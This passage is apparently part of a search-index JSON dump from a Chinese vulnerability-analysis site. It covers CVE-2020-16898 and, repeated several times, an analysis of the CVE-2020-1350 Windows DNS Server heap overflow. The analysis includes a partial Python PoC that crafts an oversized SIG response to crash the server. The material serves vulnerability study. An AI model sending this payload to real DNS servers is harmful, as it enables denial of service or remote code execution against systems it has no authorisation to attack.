Server\u7684\u5730\u5740\u4e3a0018-0027\uff0c\u540e\u7eed\u76848\u4e2a\u5b57\u8282\u4e0d\u5e94\u8be5\u518d\u8fdb\u884c\u8bc6\u522b\u3002\u9009\u4e2d\u7b2c2\u4e2aRecursive DNS Server\u65f6\u60c5\u51b5\u5982\u4e0b\uff1a \u7b2c2\u4e2aRecursive DNS Server\u7684\u5730\u5740\u4e3a0028-0037\u3002\u4f46\u662f\u8be516\u4e2a\u5b57\u8282\u4e2d\u7684\u540e8\u4e2a\u5b57\u8282\u5f88\u660e\u663e\u4e3a\u4e0b\u4e00\u4e2aICMPv6 Option\u7ed3\u6784\u7684\u5185\u5bb9\uff1a \u56db\u3001\u53c2\u8003\u6587\u732e https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/","title":"CVE-2020-16898 \"Bad Neighbor \" Windows TCP/IP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/","text":"0x00 \u6f0f\u6d1e\u80cc\u666f \u00b6 Windows DNS Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-1350\uff09\uff1a\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5411\u76ee\u6807DNS\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u6570\u636e\u5305\u4ece\u800c\u76ee\u6807\u7cfb\u7edf\u4e0a\u4ee5\u672c\u5730SYSTEM\u8d26\u6237\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u8be5\u6f0f\u6d1e\u65e0\u9700\u4ea4\u4e92\u3001\u4e0d\u9700\u8981\u8eab\u4efd\u8ba4\u8bc1\u4e14Windows DNS Server\u9ed8\u8ba4\u914d\u7f6e\u53ef\u89e6\u53d1\uff0c\u653b\u51fb\u573a\u666f\u5982\u4e0b: \uff08\u6ce8\uff1a\u56fe\u6765\u81ea\u4e92\u8054\u7f51\uff09 \u5229\u7528\u573a\u666f1\uff1a \uff081\uff09\u53d7\u5bb3\u8005\u8bbf\u95ee\u653b\u51fb\u8005\u57df\u540d\"evil.server.io\" \uff082\uff09\u672c\u5730DNS\u670d\u52a1\u5668\u6216\u57df\u5185\u7684DNS\u670d\u52a1\u5668\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\uff0c\u5411google DNS\u670d\u52a1\u5668\uff08\u59828.8.8.8\uff09\u67e5\u8be2 \uff083\uff09\u67e5\u5230\u540e\uff0c\u53d1\u73b0\u8be5\u57df\u540d\u53ef\u4ee5\u7531\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u89e3\u6790\uff0c\u6240\u4ee5\u5c06\u8be5\u4fe1\u606f\u7f13\u5b58\u5230\u57df\u670d\u52a1\u5668\u4e0a \uff084\uff09\u7b2c\u4e8c\u6b21\u67e5\u8be2\u65f6\uff0c\u76f4\u63a5\u548c\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2 \uff085\uff09\u6b64\u65f6\u653b\u51fb\u8005\u670d\u52a1\u5668\u5c31\u53ef\u4ee5\u6784\u9020\u54cd\u5e94\u5305\u89e6\u53d1\u6f0f\u6d1e \u5728\u590d\u73b0\u8fc7\u7a0b\u4e2d\uff0c\u7b14\u8005\u7701\u7565\u4e86\uff081\uff09\u3001\uff082\uff09\u3001\uff083\uff09\u6b65\uff0c\u76f4\u63a5\u5728\u672c\u5730DNS\u670d\u52a1\u5668\u4e0a\u5c06\u653b\u51fb\u8005\u670d\u52a1\u5668\u5730\u5740\u8bbe\u4e3a\u8f6c\u53d1\u5668\uff0c\u5728\u672c\u5730\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\u65f6\uff0c\u8f6c\u800c\u5411\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2\u3002 0x01 \u6f0f\u6d1e\u5206\u6790 \u00b6 DNS\u5305\u683c\u5f0f\uff1a [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-gpFNO5D3-1595035305870)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] UDP\uff1a\u8868\u793aDNS\u67e5\u8be2\u57fa\u4e8eUDP\u534f\u8bae\u4f20\u8f93\u6570\u636e\u3002DNS\u670d\u52a1\u5668\u652f\u6301TCP\u548cUDP\u4e24\u79cd\u534f\u8bae\u7684\u67e5\u8be2\u65b9\u5f0f\u3002 Destination port\uff1a\u76ee\u7684\u7aef\u53e3\u9ed8\u8ba4\u662f53\u3002 QR\uff1a0\u8868\u793a\u67e5\u8be2\u62a5\u6587\uff1b1\u8868\u793a\u56de\u5e94\u62a5\u6587\u3002 TC\uff1a\u8868\u793a\u201c\u53ef\u622a\u65ad\u7684\u201d\u3002\u5982\u679c\u4f7f\u7528UDP\u65f6\uff0c\u5f53\u5e94\u7b54\u62a5\u6587\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u53ea\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cDNS\u67e5\u8be2\u90fd\u662f\u4f7f\u7528UDP\u67e5\u8be2\uff0cUDP\u63d0\u4f9b\u65e0\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u67e5\u8be2\u901f\u5ea6\u5feb\uff0c\u53ef\u964d\u4f4e\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u3002\u5f53\u5ba2\u6237\u7aef\u53d1\u9001DNS\u8bf7\u6c42\uff0c\u5e76\u4e14\u8fd4\u56de\u54cd\u5e94\u4e2dTC\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6\uff0c\u5c31\u610f\u5473\u7740\u54cd\u5e94\u7684\u957f\u5ea6\u8d85\u8fc7512\u4e2a\u5b57\u8282\uff0c\u800c\u4ec5\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u901a\u5e38\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u76f4\u767d\u70b9\u8bf4\uff0c\u5c31\u662fUDP\u62a5\u6587\u7684\u6700\u5927\u957f\u5ea6\u4e3a512\u5b57\u8282\uff0c\u800cTCP\u5219\u5141\u8bb8\u62a5\u6587\u957f\u5ea6\u8d85\u8fc7512\u5b57\u8282\u3002\u5f53DNS\u67e5\u8be2\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u534f\u8bae\u7684TC\u6807\u5fd7\u4f4d\u4f1a\u7f6e1\uff0c\u8fd9\u65f6\u5219\u4f7f\u7528TCP\u53d1\u9001\u3002 Queries\uff1a\u8868\u793aDNS\u8bf7\u6c42\u7684\u57df\u540d\u548c\u7c7b\u578b\u3002 \u6f0f\u6d1e\u70b9\u5728\u4e8edns.exe!SigWireRead\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5904\u7406SIG\u7c7b\u578b\u7684\u54cd\u5e94\u5305\uff0cRR_AllocateEx \u5206\u914d\u5927\u5c0f\u7684\u53c2\u6570\u7531\u5bc4\u5b58\u5668cx\u4f20\u5165\uff0c\u53ea\u670916\u4e2abit\uff0c\u5927\u5c0f\u4e3a0~65535\uff0c\u6240\u4ee5\u53ea\u8981\u6784\u9020size \u5927\u4e8e65535\uff0c\u9020\u6210\u6ea2\u51fa\uff0c\u5c31\u4f1a\u5206\u914d\u4e00\u4e2a\u6bd4\u5b9e\u9645\u6570\u636e\u91cf\u5c0f\u7684\u5806\u5757\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff0c\u5c06\u6574\u6570\u6ea2\u51fa\u8f6c\u5316\u6210\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a RR_AlloccateEx\u7528\u4e8e\u5206\u914d\u5806\u5757\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5206\u914d\u7684\u5927\u5c0f\uff0c\u7531 [Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field\u2019s length (rdi\u2013rax)] \u51b3\u5b9a\u3002 \u6240\u4ee5\u8981\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u53d1\u9001\u5927\u4e8e64KB\u7684SIG\u7c7b\u578b\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u57fa\u4e8eUDP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a512\u4e2a\u5b57\u8282\uff08\u652f\u6301EDNS0\u7684\u9650\u5236\u5927\u5c0f\u4e3a4096\u4e2a\u5b57\u8282\uff09\uff0c\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\u3002 PoC\u7684\u601d\u8def\u662f\u901a\u8fc7\u8bbe\u7f6eTC\u6807\u5fd7\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u5982\u4e0b\uff1a \u4f46\u662f\u5229\u7528TCP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a65535\uff0c\u8fd8\u662f\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u7528\u5230DNS\u57df\u540d\u538b\u7f29\u3002 \u5b8c\u6574\u7684\u57df\u540d\u8868\u793a\uff0c\u5982www.google.com\uff0c\u9700\u898116\u4e2a\u5b57\u8282\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \\3 w w w \\6 g o o g l e \\3 c o m \\0 \u91c7\u7528[ ]\u7684\u5f62\u5f0f\u5b58\u50a8\u3002\u672c\u4f8b\u4e2d\u5c06\u57df\u540d\u5206\u6210\u4e86\u4e09\u6bb5\uff0c\u5206\u522b\u662fwww\uff0cgoogle\uff0ccom\u3002\u6bcf\u4e00\u6bb5\u5f00\u5934\u90fd\u6709\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u540e\u9762\u57df\u540d\u7684\u957f\u5ea6\uff0c\u6700\u540e\u4ee5\\0\u7ed3\u5c3e\u3002\u7531\u4e8e\u89c4\u5b9a\u57df\u540d\u6bb5\u7684\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc763\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8868\u793a\u57df\u540d\u6bb5\u957f\u5ea6\u7684\u5b57\u8282\u6700\u9ad8\u4e24\u4f4d\u6ca1\u6709\u7528\u5230\uff0c\u56e0\u6b64\u53e6\u6709\u7528\u9014\u3002 \uff081\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a00\u65f6\uff0c\u8868\u793a\u4ee5\u4e0a\u9762\u7684\u5f62\u5f0f\u7684\u4f20\u8f93 \uff082\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a11\u65f6\uff0c\u8868\u793a\u5c06\u57df\u540d\u8fdb\u884c\u538b\u7f29\uff0c\u8be5\u5b57\u8282\u53bb\u6389\u6700\u9ad8\u4e24\u4f4d\u540e\u5269\u4e0b\u76846\u4f4d\uff0c\u4ee5\u53ca\u540e\u9762\u76848\u4f4d\u603b\u517114\u4f4d\uff0c\u6307\u5411DNS\u6570\u636e\u62a5\u6587\u4e2d\u7684\u67d0\u4e00\u6bb5\u57df\u540d\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6307\u9488\u3002\u59820xc00c, \u8868\u793a\u4eceDNS\u6b63\u6587\uff08UDP payload\uff09\u7684\u504f\u79fboffset=0x0c\u5904\u6240\u8868\u793a\u7684\u57df\u540d\u3002 \uff083\uff09\u6df7\u5408\u8868\u793a\uff1a\u4ee5www.google.com\u4e3a\u4f8b\uff0c\u5047\u8bbe\u8be5\u57df\u540d\u4f4d\u4e8eDNS\u62a5\u6587\u504f\u79fb0x20\u5904\uff0c\u53ef\u80fd\u7684\u7528\u6cd5\u6709\uff1a a\u30010xc020\uff1a\u8868\u793a\u5b8c\u6574\u57df\u540dwww.google.com b\u30010xc024\uff1a\u4ece\u5b8c\u6574\u57df\u540d\u7684\u7b2c\u4e8c\u6bb5\u5f00\u59cb\uff0c\u6307\u4ee3google.com c\u30010x016dc024\uff1a0x01\u8868\u793a\u540e\u9762\u8ddf\u7684size\u5927\u5c0f1\uff0c0x6d\u8868\u793a\u5b57\u7b26m\uff0c\u6240\u4ee50x016d\u8868\u793a\u5b57\u7b26\u4e32\"m\"\uff0c\u7b2c\u4e8c\u6bb50xc024\u6307\u4ee3google.com\uff0c\u56e0\u6b64\u6574\u6bb5\u8868\u793am.google.com Name_PacketNameToCountNameEx\u51fd\u6570\u4f1a\u6839\u636eSigners Name \u6765\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u56e0\u6b640xc00c\uff08\u504f\u79fb\u4eceTransaction ID 0x795a\u5f00\u59cb\u8ba1\u7b97\uff09\u6307\u5411\u6b63\u5e38\u57df\u540d9.ibrokethe.net\uff0c\u5927\u5c0f\u5219\u4e3a0x11\u3002 [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-z2rI7Hdk-1595035305879)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] \u4f46\u901a\u8fc7\u8bbe\u7f6eSigner\u2019s Name\u4e3a0xc00d\uff0c\u5c06\u57df\u540d\u8d77\u59cb\u4f4d\u7f6e\u6307\u5411\"9\"\uff0c\u6b64\u65f6\u4f1a\u5c06\"9\"\u5f53\u4f5c\uff0c\u5c06\u540e\u9762\u76840x39\u4e2a\u5b57\u8282\u5f53\u4f5c\u57df\u540d\u6bb5\uff0c\u5e76\u4e14\u4e00\u76f4\u89e3\u6790\u4e0b\u53bb\uff0c\u76f4\u81f3\u89e3\u6790\u5230\u2019\\0\u2019\u3002\u5982\u4e0b\u56fe\uff0cName_PacketNameToCountNameEx\u4f1a\u5c06\u56fe\u4e2d\u9009\u4e2d\u7684\u90e8\u5206\u5f53\u6210\u57df\u540d\uff0c\u83b7\u53d6\u5927\u5c0f\u3002\u6b64\u65f6\u5927\u5c0f\u4e3a(0x39+1)+(0xf+1)*5 +1 =0x8b\u3002\uff080x39\u548c0xf\u8868\u793a\u57df\u540d\u6bb5\u5927\u5c0f\uff0c+1\u8868\u793a\".\"\uff0c \u6700\u540e\u4e00\u4e2a+1\u8868\u793a\"\\0\"\uff09\u3002 [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-20X5AEwn-1595035305880)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] windbg\u8c03\u8bd5\u7ed3\u679c\uff1a [rsp+0x30h]\u4e3a\u4f20\u5165Name_PacketNameToCountNameEx\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4fdd\u5b58\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u800c\u540e\u9762\u7684(rdi\u2013rax)\u8868\u793a\u6211\u4eec\u586b\u5145\u5230Signature\u7684\u6570\u636e\u5927\u5c0f\uff0crdi\u4e3a\u6570\u636e\u7ed3\u675f\u5730\u5740\uff0crax\u4e3a\u8d77\u59cb\u5730\u5740\uff08\u4eceSigner\u2019s Name\u540e\u5f00\u59cb\u8ba1\u7b97\uff09\u3002 \u8ba1\u7b97\u5b8c\u5927\u5c0f\u4e3a0xffaa\uff1a \u6240\u4ee5\u6700\u540e\u4f20\u5165RR_AllocateEx\u51fd\u6570\u7684\u5927\u5c0f\u4e3a (0x8b+0x14+0xffaa)&0xffff= 0x49 \u4e4b\u540e\u5c06Signature\u7684\u6570\u636e\u590d\u5236\u5230\u5206\u914d\u7684\u7a7a\u95f4\uff1a dns!memcpy \u76ee\u6807\u5730\u5740Dst\u4e3aRR_AllocateEx\u5206\u914d\u5730\u5740+\u57df\u540d\u5927\u5c0f\uff080x8b\uff09+0x4c\u5904\uff0c\u6e90\u5730\u5740Src\u4e3aSignature\u6570\u636e\u8d77\u59cb\u5730\u5740\uff0cSize\u4e3aSignature\u6570\u636e\u5927\u5c0f\uff080xffaa\uff09\u3002\u6700\u7ec8\u9020\u6210\u6ea2\u51fa\uff0c\u4ea7\u751f\u5d29\u6e83\u3002 PoC\u5efa\u7acbTCP\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u7684\u5305\u6784\u9020\u5982\u4e0b\uff1a # SIG Contents sig = \"\\x00\\x01\" # Type covered sig += \"\\x05\" # Algorithm - RSA/SHA1 sig += \"\\x00\" # Labels sig += \"\\x00\\x00\\x00\\x20\" # TTL sig += \"\\x68\\x76\\xa2\\x1f\" # Signature Expiration sig += \"\\x5d\\x2c\\xca\\x1f\" # Signature Inception sig += \"\\x9e\\x04\" # Key Tag sig += \"\\xc0\\x0d\" # Signers Name - Points to the '9' in 9.domain. sig += (\"\\x00\"*(19 - len(domain)) + (\"\\x0f\" + \"\\xff\"*15)*5).ljust(65465 - len(domain_compressed), \"\\x00\") # Signature - Here be overflows! \u2026\u2026 # Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature) connection.sendall(struct.pack('>H', len_msg) + data[2:4] + response + hdr + sig) 12345678910111213 \u4e0a\u8ff0\u6784\u9020\u7684\u4fe1\u606f\u6293\u5305\u5185\u5bb9\u5982\u4e0b\uff1a \u6574\u4e2a\u4ea4\u4e92\u8fc7\u7a0b\u5982\u4e0b\uff08\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\u6293\u5305\u7ed3\u679c\uff09\uff1a 192.168.148.134\u4e3a\u53d7\u5bb3\u8005IP\uff0c192.168.148.138\u4e3a\u653b\u51fb\u8005IP\u3002 \uff081\uff09\u53d7\u5bb3\u8005\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net \uff082\uff09\u653b\u51fb\u8005\u8fd4\u56de\u4e00\u4e2a\u54cd\u5e94\u5305\uff0c\u8bbe\u7f6eTC\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282 \uff083\uff09\u53d7\u5bb3\u8005\u5c31\u548c\u653b\u51fb\u8005\u5efa\u7acbTCP\u8fde\u63a5 \uff084\uff09\u53d7\u5bb3\u8005\u91cd\u65b0\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net \uff085\uff09\u653b\u51fb\u8005\u5229\u7528TCP\u4f20\u8f93\u5927\u4e8e64KB\u7684\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005\uff0c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u9020\u6210\u6ea2\u51fa","title":"Windows DNS  Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE 2020 1350"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/#0x00","text":"Windows DNS Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-1350\uff09\uff1a\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5411\u76ee\u6807DNS\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u6570\u636e\u5305\u4ece\u800c\u76ee\u6807\u7cfb\u7edf\u4e0a\u4ee5\u672c\u5730SYSTEM\u8d26\u6237\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u8be5\u6f0f\u6d1e\u65e0\u9700\u4ea4\u4e92\u3001\u4e0d\u9700\u8981\u8eab\u4efd\u8ba4\u8bc1\u4e14Windows DNS Server\u9ed8\u8ba4\u914d\u7f6e\u53ef\u89e6\u53d1\uff0c\u653b\u51fb\u573a\u666f\u5982\u4e0b: \uff08\u6ce8\uff1a\u56fe\u6765\u81ea\u4e92\u8054\u7f51\uff09 \u5229\u7528\u573a\u666f1\uff1a \uff081\uff09\u53d7\u5bb3\u8005\u8bbf\u95ee\u653b\u51fb\u8005\u57df\u540d\"evil.server.io\" \uff082\uff09\u672c\u5730DNS\u670d\u52a1\u5668\u6216\u57df\u5185\u7684DNS\u670d\u52a1\u5668\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\uff0c\u5411google DNS\u670d\u52a1\u5668\uff08\u59828.8.8.8\uff09\u67e5\u8be2 \uff083\uff09\u67e5\u5230\u540e\uff0c\u53d1\u73b0\u8be5\u57df\u540d\u53ef\u4ee5\u7531\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u89e3\u6790\uff0c\u6240\u4ee5\u5c06\u8be5\u4fe1\u606f\u7f13\u5b58\u5230\u57df\u670d\u52a1\u5668\u4e0a \uff084\uff09\u7b2c\u4e8c\u6b21\u67e5\u8be2\u65f6\uff0c\u76f4\u63a5\u548c\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2 \uff085\uff09\u6b64\u65f6\u653b\u51fb\u8005\u670d\u52a1\u5668\u5c31\u53ef\u4ee5\u6784\u9020\u54cd\u5e94\u5305\u89e6\u53d1\u6f0f\u6d1e \u5728\u590d\u73b0\u8fc7\u7a0b\u4e2d\uff0c\u7b14\u8005\u7701\u7565\u4e86\uff081\uff09\u3001\uff082\uff09\u3001\uff083\uff09\u6b65\uff0c\u76f4\u63a5\u5728\u672c\u5730DNS\u670d\u52a1\u5668\u4e0a\u5c06\u653b\u51fb\u8005\u670d\u52a1\u5668\u5730\u5740\u8bbe\u4e3a\u8f6c\u53d1\u5668\uff0c\u5728\u672c\u5730\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\u65f6\uff0c\u8f6c\u800c\u5411\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2\u3002","title":"0x00 \u6f0f\u6d1e\u80cc\u666f"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/#0x01","text":"DNS\u5305\u683c\u5f0f\uff1a [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-gpFNO5D3-1595035305870)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] UDP\uff1a\u8868\u793aDNS\u67e5\u8be2\u57fa\u4e8eUDP\u534f\u8bae\u4f20\u8f93\u6570\u636e\u3002DNS\u670d\u52a1\u5668\u652f\u6301TCP\u548cUDP\u4e24\u79cd\u534f\u8bae\u7684\u67e5\u8be2\u65b9\u5f0f\u3002 Destination port\uff1a\u76ee\u7684\u7aef\u53e3\u9ed8\u8ba4\u662f53\u3002 QR\uff1a0\u8868\u793a\u67e5\u8be2\u62a5\u6587\uff1b1\u8868\u793a\u56de\u5e94\u62a5\u6587\u3002 TC\uff1a\u8868\u793a\u201c\u53ef\u622a\u65ad\u7684\u201d\u3002\u5982\u679c\u4f7f\u7528UDP\u65f6\uff0c\u5f53\u5e94\u7b54\u62a5\u6587\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u53ea\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cDNS\u67e5\u8be2\u90fd\u662f\u4f7f\u7528UDP\u67e5\u8be2\uff0cUDP\u63d0\u4f9b\u65e0\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u67e5\u8be2\u901f\u5ea6\u5feb\uff0c\u53ef\u964d\u4f4e\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u3002\u5f53\u5ba2\u6237\u7aef\u53d1\u9001DNS\u8bf7\u6c42\uff0c\u5e76\u4e14\u8fd4\u56de\u54cd\u5e94\u4e2dTC\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6\uff0c\u5c31\u610f\u5473\u7740\u54cd\u5e94\u7684\u957f\u5ea6\u8d85\u8fc7512\u4e2a\u5b57\u8282\uff0c\u800c\u4ec5\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u901a\u5e38\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u76f4\u767d\u70b9\u8bf4\uff0c\u5c31\u662fUDP\u62a5\u6587\u7684\u6700\u5927\u957f\u5ea6\u4e3a512\u5b57\u8282\uff0c\u800cTCP\u5219\u5141\u8bb8\u62a5\u6587\u957f\u5ea6\u8d85\u8fc7512\u5b57\u8282\u3002\u5f53DNS\u67e5\u8be2\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u534f\u8bae\u7684TC\u6807\u5fd7\u4f4d\u4f1a\u7f6e1\uff0c\u8fd9\u65f6\u5219\u4f7f\u7528TCP\u53d1\u9001\u3002 Queries\uff1a\u8868\u793aDNS\u8bf7\u6c42\u7684\u57df\u540d\u548c\u7c7b\u578b\u3002 \u6f0f\u6d1e\u70b9\u5728\u4e8edns.exe!SigWireRead\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5904\u7406SIG\u7c7b\u578b\u7684\u54cd\u5e94\u5305\uff0cRR_AllocateEx \u5206\u914d\u5927\u5c0f\u7684\u53c2\u6570\u7531\u5bc4\u5b58\u5668cx\u4f20\u5165\uff0c\u53ea\u670916\u4e2abit\uff0c\u5927\u5c0f\u4e3a0~65535\uff0c\u6240\u4ee5\u53ea\u8981\u6784\u9020size \u5927\u4e8e65535\uff0c\u9020\u6210\u6ea2\u51fa\uff0c\u5c31\u4f1a\u5206\u914d\u4e00\u4e2a\u6bd4\u5b9e\u9645\u6570\u636e\u91cf\u5c0f\u7684\u5806\u5757\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff0c\u5c06\u6574\u6570\u6ea2\u51fa\u8f6c\u5316\u6210\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a RR_AlloccateEx\u7528\u4e8e\u5206\u914d\u5806\u5757\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5206\u914d\u7684\u5927\u5c0f\uff0c\u7531 [Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field\u2019s length (rdi\u2013rax)] \u51b3\u5b9a\u3002 